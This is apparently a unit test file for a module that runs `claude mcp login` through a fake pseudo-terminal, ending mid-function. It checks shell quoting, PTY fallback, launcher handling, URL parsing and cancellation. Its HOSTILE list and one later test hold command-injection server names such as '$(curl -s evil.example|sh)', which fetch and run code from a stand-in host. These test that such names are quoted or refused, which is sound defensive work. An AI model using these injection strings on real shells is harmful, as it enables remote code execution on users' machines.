/**
 * `claude mcp login` driven over a pseudo-terminal, with a fake PTY in place of
 * `@lydell/node-pty`. The terminal text used here is what a real CLI 2.1.x run
 * prints (captured through ConPTY): an OSC 8 hyperlink followed by the visible URL,
 * absolute cursor moves instead of line breaks, `ESC[1C` instead of some spaces.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { tmpdir } from 'os';
import { join } from 'path';

// The package must never be loaded by this file. The factory below only runs if
// something imports it, and the test for AI_BRIDGE_DISABLE_PTY asserts it did not.
const ptyImported = vi.hoisted(() => vi.fn());
vi.mock('@lydell/node-pty', () => {
  ptyImported();
  return { spawn: () => { throw new Error('the real node-pty must not be used in unit tests'); } };
});

import {
  MCP_LOGIN_TIMEOUT_MS,
  cancelAllMcpLogins,
  cancelMcpLogin,
  setMcpLoginDepsForTesting,
  startMcpLogin,
  submitMcpLoginCallbackUrl,
  terminalLoginCommand,
  type PtyModule,
  type PtyProcess,
} from '../mcp-login';
import { McpAuthenticationState, type McpServerAuthenticationStatus } from '../../../shared';
import { buildCmdCommandLine } from '../../win-exec';

const AUTH_URL =
  'http://127.0.0.1:19900/authorize?response_type=code&client_id=aib-fixture-client&state=st4te' +
  '&redirect_uri=http%3A%2F%2Flocalhost%3A43174%2Fcallback&resource=http%3A%2F%2F127.0.0.1%3A19900%2Fmcp';
// A directory that exists: a working directory that does not is refused before any PTY is asked.
const projectDir = tmpdir();
const REDIRECT_URL = 'http://localhost:43174/callback?code=SECRETCODE&state=st4te';

// What the CLI sends for the link: OSC 8 open (with an id), the visible URL, OSC 8 close.
const OSC8_LINK = `\x1b[94m\x1b]8;id=42768-1;${AUTH_URL}\x1b\\${AUTH_URL}\x1b[m\x1b]8;;\x1b\\`;
const PROMPT = '\x1b[6;1HWaiting for authorization… (^C to cancel)\r\nOr paste the redirect URL here:\x1b[K\x1b[7;33H';
const REJECTION =
  "That doesn't look like a redirect URL for this sign-in — paste the full address from the browser page this sign-in opened.";

class FakePty implements PtyProcess {
  pid = 4242;
  writes: string[] = [];
  killed = 0;
  private dataListeners = new Set<(d: string) => void>();
  private exitListeners = new Set<(e: { exitCode: number; signal?: number }) => void>();

  onData(cb: (d: string) => void) {
    this.dataListeners.add(cb);
    return { dispose: () => void this.dataListeners.delete(cb) };
  }
  onExit(cb: (e: { exitCode: number; signal?: number }) => void) {
    this.exitListeners.add(cb);
    return { dispose: () => void this.exitListeners.delete(cb) };
  }
  write(d: string) { this.writes.push(d); }
  kill() { this.killed++; }
  emitData(s: string) { for (const cb of [...this.dataListeners]) cb(s); }
  emitExit(exitCode: number) { for (const cb of [...this.exitListeners]) cb({ exitCode }); }
}

type SpawnArgs = Parameters<PtyModule['spawn']>;

let ptys: FakePty[];
let spawnCalls: SpawnArgs[];
let loadPty: ReturnType<typeof vi.fn>;
let spawnBehaviour: (() => void) | null;

function install(overrides: Parameters<typeof setMcpLoginDepsForTesting>[0] = {}) {
  ptys = [];
  spawnCalls = [];
  spawnBehaviour = null;
  loadPty = vi.fn(async (): Promise<PtyModule> => ({
    spawn: (...args: SpawnArgs) => {
      spawnBehaviour?.();
      spawnCalls.push(args);
      const p = new FakePty();
      ptys.push(p);
      return p;
    },
  }));
  setMcpLoginDepsForTesting({
    loadPty: loadPty as unknown as () => Promise<PtyModule>,
    resolveLauncher: async () => '/usr/local/bin/claude',
    baseEnv: () => ({ PATH: '/usr/bin', HOME: '/home/x' }),
    platform: 'linux',
    ...overrides,
  });
}

function start(o: { connectionId?: string; name?: string; workingDir?: string } = {}) {
  const updates: McpServerAuthenticationStatus[] = [];
  const result = startMcpLogin({
    connectionId: o.connectionId ?? 'c1',
    name: o.name ?? 'aib-fixture',
    workingDir: o.workingDir,
    onUpdate: (u) => updates.push({ ...u }),
  });
  return { updates, result };
}

const states = (updates: McpServerAuthenticationStatus[]) => updates.map((u) => u.state);

/** Start a run and bring it to AWAITING_CALLBACK. */
async function startAwaiting(o: { connectionId?: string; name?: string; workingDir?: string } = {}) {
  const { updates, result } = start(o);
  expect(await result).toEqual({ status: 'started' });
  const pty = ptys[ptys.length - 1];
  pty.emitData(`Starting authentication for "x"…\r\nVisit this URL to authorize:\r\n  ${OSC8_LINK}${PROMPT}`);
  expect(updates[updates.length - 1].state).toBe(McpAuthenticationState.AWAITING_CALLBACK);
  return { updates, pty, connectionId: o.connectionId ?? 'c1', name: o.name ?? 'aib-fixture' };
}

beforeEach(() => {
  install();
});

afterEach(() => {
  setMcpLoginDepsForTesting(null);
  vi.useRealTimers();
  vi.restoreAllMocks();
  delete process.env.AI_BRIDGE_DISABLE_PTY;
});

describe('terminalLoginCommand', () => {
  it('quotes the name the way a terminal user types it', () => {
    expect(terminalLoginCommand('aib spaced')).toBe('claude mcp login "aib spaced"');
    expect(terminalLoginCommand('aib-fixture')).toBe('claude mcp login "aib-fixture"');
    expect(terminalLoginCommand('a.b_c-1 d', 'win32')).toBe('claude mcp login "a.b_c-1 d"');
  });

  // The command is offered with a Copy button and pasted into a shell. A server name comes
  // from user or project config (a cloned repo's .mcp.json), where nothing holds it to the
  // letters `claude mcp add` accepts, so a name must never be able to end its quoting.
  const HOSTILE = [
    'x"; curl -s https://evil.example/p | sh; "',
    '$(curl -s evil.example|sh)',
    '`curl evil.example`',
    'a & calc',
    'a;b|c>d<e',
    '${IFS}rm',
    '"; echo "',
  ];
  // Each of these ends or escapes a single-quoted string in a shell people paste into:
  // `'` everywhere, `\` in fish, the typographic quotes in PowerShell.
  const UNQUOTABLE = ["it's", 'a\\b', 'a‘b', 'a’; calc; ’'];

  it.each(HOSTILE)('single-quotes %j for macOS and Linux shells, so nothing in it is interpreted', (name) => {
    const command = terminalLoginCommand(name, 'linux');

    expect(command).toBe(`claude mcp login '${name}'`);
    expect(terminalLoginCommand(name, 'darwin')).toBe(command);
  });

  it.each(UNQUOTABLE)('gives no pasteable command for %j, which no single quoting holds in every shell', (name) => {
    for (const platform of ['linux', 'darwin', 'win32'] as const) {
      expect(terminalLoginCommand(name, platform)).toBeNull();
    }
  });

  it.each(HOSTILE)('gives no pasteable command for %j on Windows, where no quoting suits both cmd.exe and PowerShell', (name) => {
    expect(terminalLoginCommand(name, 'win32')).toBeNull();
  });

  it('gives no command for a name holding a control character, on any platform', () => {
    for (const platform of ['linux', 'darwin', 'win32'] as const) {
      expect(terminalLoginCommand('a\nb', platform)).toBeNull();
      expect(terminalLoginCommand('a\x1bb', platform)).toBeNull();
    }
  });
});

describe('PTY availability', () => {
  it('answers terminal-required when the PTY cannot be loaded, and remembers it', async () => {
    vi.spyOn(console, 'error').mockImplementation(() => undefined);
    install();
    loadPty.mockRejectedValue(new Error('The @lydell/node-pty package could not find the platform-specific package'));

    const first = start({ name: 'aib spaced' });
    expect(await first.result).toMatchObject({
      status: 'terminal-required',
      command: 'claude mcp login "aib spaced"',
      reason: expect.stringContaining('platform-specific package'),
    });
    const second = start({ name: 'aib spaced' });
    expect(await second.result).toMatchObject({ status: 'terminal-required', command: 'claude mcp login "aib spaced"' });

    expect(loadPty).toHaveBeenCalledTimes(1);
    expect(first.updates).toEqual([]);
    expect(second.updates).toEqual([]);
    expect(spawnCalls).toEqual([]);
  });

  it('hands a hostile server name to the terminal command quoted, never as typed (POSIX)', async () => {
    vi.spyOn(console, 'error').mockImplementation(() => undefined);
    install();
    loadPty.mockRejectedValue(new Error('no pty here'));

    const res = await start({ name: '$(curl -s evil.example|sh)' }).result;

    expect(res).toMatchObject({ status: 'terminal-required', command: "claude mcp login '$(curl -s evil.example|sh)'" });
  });

  it('answers an error, not a command, for a name no Windows shell quoting can carry', async () => {
    vi.spyOn(console, 'error').mockImplementation(() => undefined);
    install({ platform: 'win32' });
    loadPty.mockRejectedValue(new Error('no pty here'));

    const res = await start({ name: 'x" & calc & "' }).result;

    expect(res).toMatchObject({ status: 'error', error: expect.stringContaining('cannot be put into a terminal command safely') });
    expect(JSON.stringify(res)).not.toContain('calc');
    // An ordinary name still gets its command.
    expect(await start({ name: 'aib spaced' }).result).toMatchObject({
      status: 'terminal-required',
      command: 'claude mcp login "aib spaced"',
    });
  });

  it('logs the fallback once, without the server name or any URL', async () => {
    const errors = vi.spyOn(console, 'error').mockImplementation(() => undefined);
    install();
    loadPty.mockRejectedValue(new Error('no pty here'));

    await start().result;
    await start().result;

    const fallback = errors.mock.calls.filter((c) => String(c[1]).includes('falling back to the terminal command'));
    expect(fallback).toHaveLength(1);
    expect(fallback[0][0]).toBe('[node-backend]');
    expect(fallback[0][2]).toBe('no pty here');
  });

  it('AI_BRIDGE_DISABLE_PTY=1 skips the real package entirely', async () => {
    vi.spyOn(console, 'error').mockImplementation(() => undefined);
    // Default loadPty (the real lazy import), everything else faked.
    setMcpLoginDepsForTesting({ resolveLauncher: async () => '/usr/local/bin/claude', platform: 'linux' });
    process.env.AI_BRIDGE_DISABLE_PTY = '1';

    const { result, updates } = start();

    expect(await result).toMatchObject({
      status: 'terminal-required',
      command: 'claude mcp login "aib-fixture"',
      reason: expect.stringContaining('AI_BRIDGE_DISABLE_PTY'),
    });
    expect(ptyImported).not.toHaveBeenCalled();
    expect(updates).toEqual([]);
  });

  it('treats a spawn that throws as "no PTY on this machine" and does not retry', async () => {
    vi.spyOn(console, 'error').mockImplementation(() => undefined);
    spawnBehaviour = () => { throw new Error('forkpty failed'); };

    const first = start();
    expect(await first.result).toMatchObject({ status: 'terminal-required', reason: expect.stringContaining('forkpty failed') });
    spawnBehaviour = null;
    const second = start();
    expect(await second.result).toMatchObject({ status: 'terminal-required' });

    expect(spawnCalls).toEqual([]);
    expect(first.updates).toEqual([]);
  });
});

describe('how the CLI is launched', () => {
  it('runs `claude mcp login --no-browser <name>` with the working directory and a string-only env', async () => {
    install({ baseEnv: () => ({ PATH: '/usr/bin', EMPTY: '', GONE: undefined, HOME: '/home/x' }) });

    const { updates, result } = start({ name: 'aib spaced', workingDir: projectDir });
    expect(await result).toEqual({ status: 'started' });

    const [file, args, options] = spawnCalls[0];
    expect(file).toBe('/usr/local/bin/claude');
    expect(args).toEqual(['mcp', 'login', '--no-browser', 'aib spaced']);
    expect(options.cwd).toBe(projectDir);
    expect(options.cols).toBe(1000);
    expect(options.rows).toBe(40);
    expect(options.env).toEqual({ PATH: '/usr/bin', EMPTY: '', HOME: '/home/x' });
    expect(Object.values(options.env).every((v) => typeof v === 'string')).toBe(true);
    expect(updates).toEqual([{ name: 'aib spaced', workingDir: projectDir, state: McpAuthenticationState.STARTING }]);
  });

  it('leaves cwd undefined when no working directory was given', async () => {
    await start().result;
    expect(spawnCalls[0][2].cwd).toBeUndefined();
  });

  it('answers an error, and not the terminal fallback, for a working directory that does not exist', async () => {
    vi.spyOn(console, 'error').mockImplementation(() => undefined);
    const missing = join(projectDir, 'aib-no-such-directory-for-mcp-login');

    const { result, updates } = start({ workingDir: missing });

    expect(await result).toEqual({ status: 'error', error: `The working directory does not exist: ${missing}` });
    expect(spawnCalls).toEqual([]);
    expect(updates).toEqual([]);
    // The PTY was not blamed: the next run, in a real directory, gets one.
    expect(await start({ workingDir: projectDir }).result).toEqual({ status: 'started' });
  });

  it('hands a .cmd launcher to cmd.exe as one pre-quoted command line (win32)', async () => {
    const launcher = 'C:\\npm dir\\claude.cmd';
    install({ platform: 'win32', resolveLauncher: async () => launcher });

    await start({ name: 'aib spaced', workingDir: projectDir }).result;

    const [file, args, options] = spawnCalls[0];
    expect(file).toBe(process.env.ComSpec || 'cmd.exe');
    expect(typeof args).toBe('string');
    expect(args).toBe(
      ['/d', '/v:off', '/s', '/c', buildCmdCommandLine(launcher, ['mcp', 'login', '--no-browser', 'aib spaced'])].join(' '),
    );
    expect((args as string).startsWith('/d /v:off /s /c "')).toBe(true);
    expect(options.cwd).toBe(projectDir);
  });

  it('runs an .exe launcher directly with an argv array (win32)', async () => {
    install({ platform: 'win32', resolveLauncher: async () => 'C:\\Users\\a b\\.local\\bin\\claude.exe' });

    await start({ name: 'aib spaced' }).result;

    const [file, args] = spawnCalls[0];
    expect(file).toBe('C:\\Users\\a b\\.local\\bin\\claude.exe');
    expect(args).toEqual(['mcp', 'login', '--no-browser', 'aib spaced']);
  });

  // The bug this replaces: an unresolved launcher used to be treated as a batch file, so
  // `.exe`-install users got the batch escaping's extra carets (`a^ b` for `a b`) on a
  // native binary. execViaCmd refuses in that situation; the sign-in now does the same.
  it('refuses a bare launcher name instead of guessing it is a batch file (win32)', async () => {
    vi.spyOn(console, 'error').mockImplementation(() => undefined);
    install({ platform: 'win32', resolveLauncher: async () => 'claude' });

    const { result, updates } = start({ name: 'aib spaced' });
    const res = await result;

    expect(res.status).toBe('error');
    expect(res).toMatchObject({ error: expect.stringMatching(/Could not resolve the claude launcher.*Claude CLI path/) });
    expect(spawnCalls).toEqual([]);
    expect(updates).toEqual([]);
    // Not a PTY problem: the next, resolvable launch still gets one.
    install({ platform: 'win32', resolveLauncher: async () => 'C:\\npm\\claude.cmd' });
    expect(await start().result).toEqual({ status: 'started' });
    expect(spawnCalls).toHaveLength(1);
  });

  it('refuses an extension-less resolved launcher (win32)', async () => {
    vi.spyOn(console, 'error').mockImplementation(() => undefined);
    install({ platform: 'win32', resolveLauncher: async () => 'C:\\tools\\claude' });

    const { result } = start({ name: 'a b' });

    expect(await result).toMatchObject({ status: 'error', error: expect.stringMatching(/Claude CLI path/) });
    expect(spawnCalls).toEqual([]);
  });

  it('passes a name with spaces and cmd metacharacters to an .exe launcher untouched (win32)', async () => {
    install({ platform: 'win32', resolveLauncher: async () => 'C:\\Users\\a b\\.local\\bin\\claude.exe' });

    await start({ name: 'a&b c^d' }).result;

    expect(spawnCalls[0][1]).toEqual(['mcp', 'login', '--no-browser', 'a&b c^d']);
  });

  it('collapses env keys that differ only in case on win32, the later one winning', async () => {
    install({ platform: 'win32', resolveLauncher: async () => 'C:\\x\\claude.exe', baseEnv: () => ({ Path: 'old', SystemRoot: 'C:\\Windows', PATH: 'augmented' }) });

    await start().result;

    expect(spawnCalls[0][2].env).toEqual({ SystemRoot: 'C:\\Windows', PATH: 'augmented' });
  });

  it('answers with an error, not a fallback, when a name cannot be passed to cmd.exe (win32 "%")', async () => {
    vi.spyOn(console, 'error').mockImplementation(() => undefined);
    install({ platform: 'win32', resolveLauncher: async () => 'C:\\npm\\claude.cmd' });

    const { result, updates } = start({ name: 'a%PATH%b' });
    const res = await result;

    expect(res).toMatchObject({ status: 'error', error: expect.stringContaining("'%'") });
    expect(spawnCalls).toEqual([]);
    expect(updates).toEqual([]);
    // Not a PTY problem: the next, valid name still gets a PTY.
    await start({ name: 'fine' }).result;
    expect(spawnCalls).toHaveLength(1);
  });

  it('survives the darwin spawn-helper preparation not finding anything', async () => {
    install({ platform: 'darwin' });
    expect(await start().result).toEqual({ status: 'started' });
    expect(spawnCalls).toHaveLength(1);
  });
});

describe('authorization URL', () => {
  it('finds an OSC 8 hyperlink split across three chunks and reports it once', async () => {
    const { updates, result } = start();
    await result;
    const pty = ptys[0];
    const whole = `Starting authentication for "aib-fixture"…\r\nVisit this URL to authorize:\r\n  ${OSC8_LINK}${PROMPT}`;
    // Cut inside the escape introducer and inside the target.
    const a = whole.indexOf('\x1b]8;id') + 1;
    const b = whole.indexOf('authorize?response_type') + 12;

    pty.emitData(whole.slice(0, a));
    pty.emitData(whole.slice(a, b));
    expect(states(updates)).toEqual([McpAuthenticationState.STARTING]);
    pty.emitData(whole.slice(b));

    const awaiting = updates.filter((u) => u.state === McpAuthenticationState.AWAITING_CALLBACK);
    expect(awaiting).toEqual([
      { name: 'aib-fixture', state: McpAuthenticationState.AWAITING_CALLBACK, url: AUTH_URL },
    ]);

    // More output must not report the URL again.
    pty.emitData('\x1b[?25l');
    expect(updates.filter((u) => u.state === McpAuthenticationState.AWAITING_CALLBACK)).toHaveLength(1);
  });

  it('ignores the OSC 8 close sequence and a terminal-title OSC', async () => {
    const { updates, result } = start();
    await result;

    ptys[0].emitData('\x1b]0;C:\\WINDOWS\\SYSTEM32\\cmd.exe\x07\x1b]8;;\x1b\\');

    expect(states(updates)).toEqual([McpAuthenticationState.STARTING]);
  });

  it('falls back to the visible URL when there is no hyperlink, through conpty cursor gaps', async () => {
    const { updates, result } = start();
    await result;

    ptys[0].emitData(
      'Starting\x1b[1Cauthentication\x1b[1Cfor\x1b[1C"aib-fixture"…\r\n' +
      'Visit\x1b[1Cthis\x1b[1CURL\x1b[1Cto\x1b[1Cauthorize:\r\n' +
      `  \x1b[94m${AUTH_URL}\x1b[m\x1b[6;1HWaiting for authorization…`,
    );

    expect(updates[updates.length - 1]).toEqual({ name: 'aib-fixture', state: McpAuthenticationState.AWAITING_CALLBACK, url: AUTH_URL });
  });

  it('does not report a half-received visible URL', async () => {
    const { updates, result } = start();
    await result;
    const pty = ptys[0];
    const cut = AUTH_URL.indexOf('&client_id');

    pty.emitData(`Visit this URL to authorize:\r\n  ${AUTH_URL.slice(0, cut)}`);
    expect(states(updates)).toEqual([McpAuthenticationState.STARTING]);
    pty.emitData(`${AUTH_URL.slice(cut)}\x1b[6;1HWaiting`);

    expect(updates.filter((u) => u.state === McpAuthenticationState.AWAITING_CALLBACK)).toEqual([
      { name: 'aib-fixture', state: McpAuthenticationState.AWAITING_CALLBACK, url: AUTH_URL },
    ]);
  });

  it('does not take a URL that appears before the "Visit this URL" marker', async () => {
    const { updates, result } = start();
    await result;

    ptys[0].emitData('[mcp-sdk] see https://example.com/docs for details\r\n');

    expect(states(updates)).toEqual([McpAuthenticationState.STARTING]);
  });

  it('survives a throwing onUpdate', async () => {
    vi.spyOn(console, 'error').mockImplementation(() => undefined);
    const result = startMcpLogin({ connectionId: 'c1', name: 'n', onUpdate: () => { throw new Error('socket closed'); } });
    expect(await result).toEqual({ status: 'started' });

    expect(() => ptys[0].emitData(`Visit this URL to authorize:\r\n  ${OSC8_LINK}${PROMPT}`)).not.toThrow();
    expect(() => ptys[0].emitExit(0)).not.toThrow();
  });
});

describe('pasting the redirect URL', () => {
  it('writes the URL plus Enter, moves to VERIFYING with the authorization URL, and ends with SUCCEEDED', async () => {
    const { updates, pty } = await startAwaiting();

    expect(submitMcpLoginCallbackUrl('c1', 'aib-fixture', REDIRECT_URL)).toEqual({ status: 'ok' });

    expect(pty.writes).toEqual([`${REDIRECT_URL}\r`]);
    expect(updates[updates.length - 1]).toEqual({ name: 'aib-fixture', state: McpAuthenticationState.VERIFYING, url: AUTH_URL });

    pty.emitData(`\x1b[?25lttp://localhost:43174/callback\x1b[11;1HAuthenticated with "aib-fixture". Its tools are now available in Claude Code.\r\n`);
    pty.emitExit(0);

    expect(updates[updates.length - 1]).toMatchObject({ state: McpAuthenticationState.SUCCEEDED, exitCode: 0 });
    expect(updates[updates.length - 1].error).toBeUndefined();
    expect(submitMcpLoginCallbackUrl('c1', 'aib-fixture', REDIRECT_URL)).toEqual({
      status: 'error',
      error: 'No sign-in is running for this server.',
    });
  });

  it('trims surrounding whitespace before writing', async () => {
    const { pty } = await startAwaiting();

    expect(submitMcpLoginCallbackUrl('c1', 'aib-fixture', `   ${REDIRECT_URL}   `)).toEqual({ status: 'ok' });
    expect(pty.writes).toEqual([`${REDIRECT_URL}\r`]);
  });

  it('refuses a paste while the CLI is not waiting for one', async () => {
    const { updates, result } = start();
    await result;

    expect(submitMcpLoginCallbackUrl('c1', 'aib-fixture', REDIRECT_URL)).toEqual({
      status: 'error',
      error: 'The sign-in is not waiting for a redirect URL.',
    });
    expect(ptys[0].writes).toEqual([]);
    expect(states(updates)).toEqual([McpAuthenticationState.STARTING]);
  });

  it('refuses a second paste while the first is being verified', async () => {
    const { pty } = await startAwaiting();
    submitMcpLoginCallbackUrl('c1', 'aib-fixture', REDIRECT_URL);

    expect(submitMcpLoginCallbackUrl('c1', 'aib-fixture', REDIRECT_URL)).toMatchObject({ status: 'error' });
    expect(pty.writes).toHaveLength(1);
  });

  it('answers a refused paste with the CLI sentence and goes back to waiting, keeping the URL', async () => {
    const { updates, pty } = await startAwaiting();
    submitMcpLoginCallbackUrl('c1', 'aib-fixture', 'http://localhost:1/callback?code=x&state=nope');

    pty.emitData('h');
    pty.emitData(`\x1b[?25lttp://localhost:1/callback?code=x&state=nope\r\n${REJECTION}\r\nOr paste the redirect URL here:\x1b[K\x1b[9;33H`);

    const last = updates[updates.length - 1];
    expect(last.state).toBe(McpAuthenticationState.AWAITING_CALLBACK);
    expect(last.url).toBe(AUTH_URL);
    expect(last.error).toContain("doesn't look like a redirect URL");
    expect(last.error).not.toContain('Or paste');
    expect(last.error).not.toContain('code=');

    // It is waiting again: a better paste is accepted.
    expect(submitMcpLoginCallbackUrl('c1', 'aib-fixture', REDIRECT_URL)).toEqual({ status: 'ok' });
    expect(pty.writes).toHaveLength(2);
  });

  it('recognises the refusal when conpty drew spaces as cursor moves, and again after a second paste', async () => {
    const { updates, pty } = await startAwaiting();
    const spaced = REJECTION.replace(/ /g, '\x1b[1C');

    submitMcpLoginCallbackUrl('c1', 'aib-fixture', 'http://localhost:1/callback?code=x&state=nope');
    pty.emitData(`\r\n${spaced}\r\nOr\x1b[1Cpaste\x1b[1Cthe\x1b[1Credirect\x1b[1CURL\x1b[1Chere:`);
    expect(updates[updates.length - 1].state).toBe(McpAuthenticationState.AWAITING_CALLBACK);
    expect(updates[updates.length - 1].error).toContain("doesn't look like a redirect URL");

    const before = updates.length;
    submitMcpLoginCallbackUrl('c1', 'aib-fixture', 'http://localhost:2/callback?code=y&state=nope');
    expect(updates[before].state).toBe(McpAuthenticationState.VERIFYING);
    pty.emitData(`\r\n${spaced}\r\n`);
    expect(updates[updates.length - 1]).toMatchObject({ state: McpAuthenticationState.AWAITING_CALLBACK });
    expect(updates.length).toBe(before + 2);
  });

  it('does not mistake the first refusal for an answer to the second paste', async () => {
    const { updates, pty } = await startAwaiting();
    submitMcpLoginCallbackUrl('c1', 'aib-fixture', 'http://localhost:1/callback?code=x&state=nope');
    pty.emitData(`\r\n${REJECTION}\r\n`);

    submitMcpLoginCallbackUrl('c1', 'aib-fixture', REDIRECT_URL);
    pty.emitData('\x1b[?25l');

    expect(updates[updates.length - 1].state).toBe(McpAuthenticationState.VERIFYING);
  });

  it.each([
    ['a non-http scheme', 'ftp://x/callback?code=1'],
    ['a line break', 'http://a/b\nhttp://c/d'],
    ['a carriage return', 'http://a/b\rhttp://c/d'],
    ['more than 8192 characters', `http://x/${'a'.repeat(9000)}`],
    ['text that is not a URL', 'not a url'],
    ['an empty paste', '   '],
    ['whitespace inside', 'http://a/b c'],
    // `new URL()` accepts these (it percent-encodes them), but the raw text is what gets
    // typed, and a terminal turns them into Ctrl+C, an escape sequence or a line kill.
    ['Ctrl+C (ETX)', 'http://localhost:1/callback?code=a\x03b'],
    ['an escape sequence', 'http://localhost:1/callback?code=a\x1b[2Jb'],
    ['a line kill (NAK)', 'http://localhost:1/callback?code=a\x15b'],
    ['a NUL', 'http://localhost:1/callback?code=a\x00b'],
    ['DEL', 'http://localhost:1/callback?code=a\x7fb'],
    ['an 8-bit CSI (C1 control)', 'http://localhost:1/callback?code=a\x9b2Jb'],
    ['a leading control character', '\x03http://localhost:1/callback?code=a'],
  ])('rejects %s and writes nothing', async (_label, paste) => {
    const { updates, pty } = await startAwaiting();
    const before = updates.length;

    const res = submitMcpLoginCallbackUrl('c1', 'aib-fixture', paste);

    expect(res.status).toBe('error');
    expect(pty.writes).toEqual([]);
    expect(updates).toHaveLength(before);
  });

  it('tells which paste form is wanted', async () => {
    await startAwaiting();
    expect(submitMcpLoginCallbackUrl('c1', 'aib-fixture', 'nope')).toEqual({
      status: 'error',
      error: 'Paste the full redirect address (http://… or https://…).',
    });
  });

  it('knows nothing of another connection or another server', async () => {
    const { pty } = await startAwaiting();

    expect(submitMcpLoginCallbackUrl('c2', 'aib-fixture', REDIRECT_URL)).toMatchObject({ status: 'error' });
    expect(submitMcpLoginCallbackUrl('c1', 'other', REDIRECT_URL)).toMatchObject({ status: 'error' });
    expect(pty.writes).toEqual([]);
  });
});

describe('the process ending', () => {
  it('reports a non-zero exit as FAILED with the last lines of CLI output and the exit code', async () => {
    const { updates, result } = start();
    await result;
    ptys[0].emitData('Starting authentication for "x"…\r\nsome noise\r\nOops one\r\n\r\nOops two\r\nOops three\r\n');
    ptys[0].emitExit(1);

    const last = updates[updates.length - 1];
    expect(last.state).toBe(McpAuthenticationState.FAILED);
    expect(last.exitCode).toBe(1);
    expect(last.error).toBe('Oops one\nOops two\nOops three');
  });

  it('keeps a pasted URL, and the code in it, out of the failure text', async () => {
    const { updates, pty } = await startAwaiting();
    submitMcpLoginCallbackUrl('c1', 'aib-fixture', REDIRECT_URL);
    pty.emitData(`h${REDIRECT_URL.slice(1)}\r\nToken exchange failed for ${REDIRECT_URL}\r\n`);
    pty.emitExit(1);

    const last = updates[updates.length - 1];
    expect(last.state).toBe(McpAuthenticationState.FAILED);
    expect(last.error).toContain('Token exchange failed for');
    expect(last.error).not.toContain('SECRETCODE');
    expect(last.error).not.toContain('http://');
  });

  it('caps the failure text at 500 characters, keeping the end', async () => {
    const { updates, result } = start();
    await result;
    ptys[0].emitData(`${'x'.repeat(900)}\r\nthe real reason\r\n`);
    ptys[0].emitExit(1);

    const error = updates[updates.length - 1].error!;
    expect(error.length).toBeLessThanOrEqual(500);
    expect(error.endsWith('the real reason')).toBe(true);
  });

  it('reports a non-zero exit with no output as FAILED without text', async () => {
    const { updates, result } = start();
    await result;
    ptys[0].emitExit(3);

    expect(updates[updates.length - 1]).toEqual({ name: 'aib-fixture', state: McpAuthenticationState.FAILED, exitCode: 3 });
  });

  it('lets a new run start once the previous one ended', async () => {
    const first = start();
    await first.result;
    ptys[0].emitExit(0);

    const second = start();
    expect(await second.result).toEqual({ status: 'started' });
    expect(ptys).toHaveLength(2);
  });
});

describe('cancel and timeout', () => {
  it('cancel reports CANCELLED, sends Ctrl+C, and kills a process that does not leave', async () => {
    vi.useFakeTimers();
    install({ cancelGraceMs: 1500 });
    const { updates, pty } = await startAwaiting();

    expect(cancelMcpLogin('c1', 'aib-fixture')).toBe(true);

    expect(updates[updates.length - 1]).toMatchObject({ state: McpAuthenticationState.CANCELLED, url: AUTH_URL });
    expect(pty.writes).toEqual(['\x03']);
    expect(pty.killed).toBe(0);

    vi.advanceTimersByTime(1499);
    expect(pty.killed).toBe(0);
    vi.advanceTimersByTime(1);
    expect(pty.killed).toBe(1);

    // The late exit says nothing more.
    const count = updates.length;
    pty.emitExit(130);
    expect(updates).toHaveLength(count);
  });

  it('does not kill a process that left on Ctrl+C, and the exit adds no update', async () => {
    vi.useFakeTimers();
    install({ cancelGraceMs: 1500 });
    const { updates, pty } = await startAwaiting();
    cancelMcpLogin('c1', 'aib-fixture');
    const count = updates.length;

    pty.emitExit(130);
    vi.advanceTimersByTime(5000);

    expect(pty.killed).toBe(0);
    expect(updates).toHaveLength(count);
  });

  it('cancel on nothing running returns false', () => {
    expect(cancelMcpLogin('c1', 'aib-fixture')).toBe(false);
  });

  it('cancelling twice only cancels once', async () => {
    const { updates } = await startAwaiting();
    expect(cancelMcpLogin('c1', 'aib-fixture')).toBe(true);
    const count = updates.length;
    expect(cancelMcpLogin('c1', 'aib-fixture')).toBe(false);
    expect(updates).toHaveLength(count);
  });

  it('a cancelled run can be started again', async () => {
    vi.useFakeTimers();
    install({ cancelGraceMs: 1500 });
    await startAwaiting();
    cancelMcpLogin('c1', 'aib-fixture');

    const again = start();
    expect(await again.result).toEqual({ status: 'started' });
    expect(ptys).toHaveLength(2);
    // Nothing the dying run does reaches the new run's listener.
    ptys[0].emitData(`Visit this URL to authorize:\r\n  ${OSC8_LINK}${PROMPT}`);
    expect(states(again.updates)).toEqual([McpAuthenticationState.STARTING]);
  });

  it('ends a run that waits too long with TIMED_OUT and kills it', async () => {
    vi.useFakeTimers();
    install({ timeoutMs: 1000, cancelGraceMs: 1500 });
    const { updates, pty } = await startAwaiting();

    vi.advanceTimersByTime(999);
    expect(updates[updates.length - 1].state).toBe(McpAuthenticationState.AWAITING_CALLBACK);
    vi.advanceTimersByTime(1);

    expect(updates[updates.length - 1]).toMatchObject({ state: McpAuthenticationState.TIMED_OUT, url: AUTH_URL });
    expect(pty.killed).toBe(1);
    const count = updates.length;
    pty.emitExit(1);
    expect(updates).toHaveLength(count);
  });

  it('does not time out a run that already finished', async () => {
    vi.useFakeTimers();
    install({ timeoutMs: 1000 });
    const { updates, result } = start();
    await result;
    ptys[0].emitExit(0);
    const count = updates.length;

    vi.advanceTimersByTime(10_000);

    expect(updates).toHaveLength(count);
    expect(ptys[0].killed).toBe(0);
  });

  it('defaults the timeout to five minutes', () => {
    expect(MCP_LOGIN_TIMEOUT_MS).toBe(5 * 60_000);
  });

  it('closing a connection kills its runs silently and leaves the others', async () => {
    const one = await startAwaiting({ connectionId: 'c1', name: 'a' });
    const two = await startAwaiting({ connectionId: 'c1', name: 'b' });
    const other = await startAwaiting({ connectionId: 'c2', name: 'a' });
    const counts = [one.updates.length, two.updates.length, other.updates.length];

    cancelAllMcpLogins('c1');

    expect(one.pty.killed).toBe(1);
    expect(two.pty.killed).toBe(1);
    expect(other.pty.killed).toBe(0);
    expect([one.updates.length, two.updates.length, other.updates.length]).toEqual(counts);
    // The closed connection's key is free, the other one is still running.
    expect(cancelMcpLogin('c1', 'a')).toBe(false);
    expect(cancelMcpLogin('c2', 'a')).toBe(true);
  });
});

// The launch is two awaits long (the lazy node-pty import, `where claude`) before the
// process exists. A socket that closes inside that window used to find nothing to kill,
// and the CLI then ran, with its loopback listener, until the five-minute timeout.
describe('a connection that closes while its run is still launching', () => {
  /** Hold the PTY import (or the launcher lookup) until `release()`. */
  function holdLaunch(stage: 'loadPty' | 'resolveLauncher') {
    let release!: () => void;
